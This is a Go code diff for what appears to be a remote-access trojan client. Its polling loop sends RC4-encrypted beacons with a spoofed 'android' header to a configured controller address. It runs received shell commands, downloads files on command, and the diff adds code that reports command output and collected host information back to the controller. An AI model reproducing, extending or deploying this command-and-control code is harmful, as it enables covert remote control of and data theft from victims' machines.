@@ -13,67 +13,73 @@ import (
 	"time"
 )
 
-type Down struct {
-	Url  string `json:"url"`
-	Path string `json:"path"`
+type Result struct {
+	Action string `json:"action"`
+	Data   string `json:"data"`
 }
-type Shell struct {
-	Command string `json:"command"`
-	Param   string `json:"param"`
-}
+
 type Work struct {
-	Uuid       string `json:"uuid"`
-	Last       string `json:"last"`
-	Result     string `json:"result"`
-	User       string `json:"user"`
-	Ip         string `json:"ip"`
-	NextSecond string `json:"next_second"`
+	Uuid       string            `json:"uuid"`
+	Result     Result            `json:"result"`
+	Info       utils.Information `json:"info"`
+	NextSecond int               `json:"next_second"`
 }
 type Action struct {
 	Do   string `json:"do"`
 	Data string `json:"data"`
 }
+
 type Core struct {
 	remoteAddress string
-	remarks       string
+	info          utils.Information
 	sleep         int
 	uuid          string
-	last          string
 }
 
 func (c *Core) Pool() {
+
+	var r Result
 	client := &http.Client{}
 	for {
+
 		time.Sleep(time.Duration(c.sleep) * time.Second)
 		var result Action
-		data := Work{Uuid: c.uuid, Last: "first"}
-		bytesJson, _ := json.Marshal(data)
-		req, _ := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(bytesJson))
+		data := Work{Uuid: c.uuid, Info: c.info}
+		bytesJson, err := json.Marshal(data)
+		if err != nil {
+			continue
+		}
+		encode := utils.ImmediateRC4(bytesJson)
+		req, err := http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
+		if err != nil {
+			continue
+		}
 		req.Header.Add("UA", "android")
 		resp, _ := client.Do(req)
 		body, _ := ioutil.ReadAll(resp.Body)
 		decode := utils.ImmediateRC4(body)
-		err := json.Unmarshal(decode, &result)
+		err = json.Unmarshal(decode, &result)
 		if err != nil {
 			continue
 		}
 		switch result.Do {
 		case "cmd":
-			var cmd Shell
+			var cmd shell.Shell
 			err := json.Unmarshal([]byte(result.Data), &cmd)
 			if err != nil {
-				c.last = "Shel  Error."
-				continue
+				r = Result{Action: "cmd", Data: err.Error()}
+				break
 			}
-			shell.ExecuteCmd(cmd.Command, cmd.Param)
+			r = Result{Action: "cmd", Data: cmd.ExecuteCmd()}
 		case "download":
-			var down Down
+			var down shell.Down
+
 			err := json.Unmarshal([]byte(result.Data), &down)
 			if err != nil {
-				c.last = "Download Param Error."
-				continue
+				r = Result{Action: "download", Data: err.Error()}
+
 			}
-			shell.Download(down.Url, down.Path)
+			r = Result{Action: "download", Data: down.Download()}
 		case "update":
 			// update :
 		case "sleep":
@@ -82,7 +88,19 @@ func (c *Core) Pool() {
 				c.sleep = sleep
 			}
 		}
-
+		data = Work{Uuid: c.uuid, Result: r, Info: c.info, NextSecond: c.sleep}
+		bytesJson, err = json.Marshal(data)
+		if err != nil {
+			continue
+		}
+		encode = utils.ImmediateRC4(bytesJson)
+		req, err = http.NewRequest("POST", c.remoteAddress, bytes.NewReader(encode))
+		if err != nil {
+			continue
+		}
+		req.Header.Add("UA", "android")
+		resp, _ = client.Do(req)
+		_, _ = ioutil.ReadAll(resp.Body)
 	}
 }
 
@@ -97,7 +115,7 @@ func NewClient() Core {
 
 	c := Core{
 		remoteAddress: config.RemoteAddres,
-		remarks:       utils.GetRemarks(),
+		info:          utils.GetInformation(),
 		uuid:          u,
 		sleep:         config.DefaultSleep,
 	}
